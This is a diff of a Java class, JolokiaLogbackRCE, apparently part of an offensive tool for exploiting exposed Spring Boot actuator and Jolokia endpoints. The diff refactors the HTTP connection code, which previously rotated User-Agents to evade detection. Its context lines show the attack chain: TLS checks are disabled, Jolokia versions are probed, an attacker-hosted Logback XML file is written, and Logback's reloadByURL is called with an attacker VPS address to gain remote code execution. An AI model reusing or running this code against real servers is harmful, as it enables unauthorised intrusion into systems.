@@ -1,7 +1,7 @@
 package src.main.module;
 
-import src.main.LoadLib.ClassCom.ClsComp;
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
+import src.main.loadlib.ClassCom.ClsComp;
 import src.main.common.VersionComparator;
 import src.main.impl.ResultCallback;
 
@@ -10,14 +10,11 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
-import java.net.URL;
-import java.util.Base64;
-import java.util.List;
 import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class JolokiaLogbackRCE {
     private String address;
@@ -43,16 +40,10 @@ public class JolokiaLogbackRCE {
         String site = address + "/env";
         String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
         String reloURL = "reloadByURL";
-        String ua = "";
         String data = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -74,10 +65,7 @@ public class JolokiaLogbackRCE {
                     callback.onResult(text);
                     text = "当前jolokia-core版本为: " + matcher1.group(1);
                     callback.onResult(text);
-                    URL obj1 = new URL(address +  api + "/list");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent", ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address +  api + "/list");
                     conn1.setRequestMethod("GET");
                     conn1.setDoOutput(true);
                     int responseCode1 = conn1.getResponseCode();
@@ -108,10 +96,7 @@ public class JolokiaLogbackRCE {
                             text = "JolokiaLogback.xml文件写入成功";
                             callback.onResult(text);
                             String urltmp = String.format(payloadURL,vpsIP);
-                            URL obj2 = new URL(address + urltmp);
-                            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                            ua = uacf.getRandomUserAgent(ualist);
-                            conn2.setRequestProperty("User-Agent", ua);
+                            HttpURLConnection conn2 = HTTPConfig.createConnection(address + urltmp);
                             conn2.setRequestMethod("GET");
                             conn2.setReadTimeout(2000);    // 设置读取超时
                             conn2.setDoOutput(true);// 设置读取超时
@@ -152,16 +137,10 @@ public class JolokiaLogbackRCE {
         String site = address + "/actuator/env";
         String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
         String reloURL = "reloadByURL";
-        String ua = "";
         String data = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -183,10 +162,7 @@ public class JolokiaLogbackRCE {
                     callback.onResult(text);
                     text = "当前jolokia-core版本为: " + matcher1.group(1);
                     callback.onResult(text);
-                    URL obj1 = new URL(address +  api + "/list");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent", ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address +  api + "/list");
                     conn1.setRequestMethod("GET");
                     conn1.setDoOutput(true);
                     int responseCode1 = conn1.getResponseCode();
@@ -217,10 +193,7 @@ public class JolokiaLogbackRCE {
                             text = "JolokiaLogback.xml文件写入成功";
                             callback.onResult(text);
                             String urltmp = String.format(payloadURL,vpsIP);
-                            URL obj2 = new URL(address + urltmp);
-                            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                            ua = uacf.getRandomUserAgent(ualist);
-                            conn2.setRequestProperty("User-Agent", ua);
+                            HttpURLConnection conn2 = HTTPConfig.createConnection(address + urltmp);
                             conn2.setRequestMethod("GET");
                             conn2.setReadTimeout(2000);    // 设置读取超时
                             conn2.setDoOutput(true);// 设置读取超时
@@ -258,15 +231,9 @@ public class JolokiaLogbackRCE {
         String site = address + "/env";
         String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
         String reloURL = "reloadByURL";
-        String ua = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -288,10 +255,7 @@ public class JolokiaLogbackRCE {
                     callback.onResult(text);
                     text = "当前jolokia-core版本为: " + matcher1.group(1);
                     callback.onResult(text);
-                    URL obj1 = new URL(address + api + "/list");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent", ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + api + "/list");
                     conn1.setRequestMethod("GET");
                     conn1.setDoOutput(true);
                     int responseCode1 = conn1.getResponseCode();
@@ -332,15 +296,9 @@ public class JolokiaLogbackRCE {
         String site = address + "/actuator/env";
         String logbak = "ch.qos.logback.classic.jmx.JMXConfigurator";
         String reloURL = "reloadByURL";
-        String ua = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -362,10 +320,7 @@ public class JolokiaLogbackRCE {
                     callback.onResult(text);
                     text = "当前jolokia-core版本为: " + matcher1.group(1);
                     callback.onResult(text);
-                    URL obj1 = new URL(address + api + "/list");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent", ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + api + "/list");
                     conn1.setRequestMethod("GET");
                     conn1.setDoOutput(true);
                     int responseCode1 = conn1.getResponseCode();
@@ -385,10 +340,8 @@ public class JolokiaLogbackRCE {
                                     VersionComparator.isVersionAtLeast(matcher.group(1),"7u191") ||
                                     VersionComparator.isVersionAtLeast(matcher.group(1),"6u201")
                     ){
-                        URL obj2 = new URL(address + "/actuator");
-                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+                        HttpURLConnection conn2 = HTTPConfig.createConnection(address + "/actuator");
                         conn2.setDoOutput(true);
-                        conn2.setRequestProperty("User-Agent", ua);
                         conn2.setRequestMethod("GET");
                         int responseCode2 = conn2.getResponseCode();
                         BufferedReader in2 = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
@@ -420,15 +373,9 @@ public class JolokiaLogbackRCE {
     public void Exp(ResultCallback callback){
         String api = "/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
